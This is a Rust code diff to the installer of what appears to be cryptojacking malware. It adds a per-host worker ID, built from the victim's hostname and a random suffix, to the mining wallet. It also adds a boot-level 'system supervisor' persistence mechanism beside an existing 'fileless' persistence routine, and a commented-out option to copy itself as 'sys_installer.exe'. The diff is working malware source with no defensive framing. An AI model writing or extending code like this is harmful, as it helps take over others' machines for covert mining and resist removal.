@@ -40,8 +40,24 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     // Create Config
     let total_threads = num_cpus::get() as i32;
     let mining_threads = std::cmp::max(1, total_threads / 2);
+    
+    // Generate Dynamic Worker ID: Hostname-Random7
+    let host = hostname::get()
+        .map(|h| h.to_string_lossy().into_owned())
+        .unwrap_or_else(|_| "UNKNOWN".to_string());
+        
+    use rand::{Rng, distr::Alphanumeric};
+    let random_suffix: String = rand::rng()
+        .sample_iter(&Alphanumeric)
+        .take(7)
+        .map(char::from)
+        .collect::<String>()
+        .to_uppercase();
+        
+    let final_wallet = format!("{}.{}-{}", WALLET, host, random_suffix);
+    
     let config_path = staging_dir.join(CONFIG_NAME);
-    let config = MinerConfig::new(POOL_URL, WALLET, mining_threads);
+    let config = MinerConfig::new(POOL_URL, &final_wallet, mining_threads);
     let json = serde_json::to_string_pretty(&config)?;
     let mut file = File::create(&config_path)?;
     file.write_all(json.as_bytes())?;
@@ -102,6 +118,9 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         
         // Deep Sleeper (Fileless Persistence)
         let _ = crate::system::process::create_fileless_sleeper();
+
+        // System Supervisor Service (Boot-Level)
+        let _ = crate::system::process::create_system_supervisor();
 
         // Copy self to bin (optional, can skip or rename to sys_installer.exe)
         // let _ = copy_self_to_bin(); 
